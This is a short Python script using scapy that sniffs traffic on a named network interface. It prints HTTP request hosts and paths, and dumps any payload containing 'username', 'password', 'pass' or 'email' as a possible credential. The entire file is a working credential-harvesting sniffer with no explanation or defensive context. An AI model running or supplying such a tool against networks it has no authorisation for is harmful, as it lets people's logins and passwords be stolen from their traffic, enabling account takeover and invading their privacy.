#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets", required=True)
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        print(f"[+] HTTP Request >> {host}{path}")
        
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print(f"\n\n\n[+] Possible password/username >> {load}\n\n\n")
                    break

iface = get_interface()
sniff(iface)
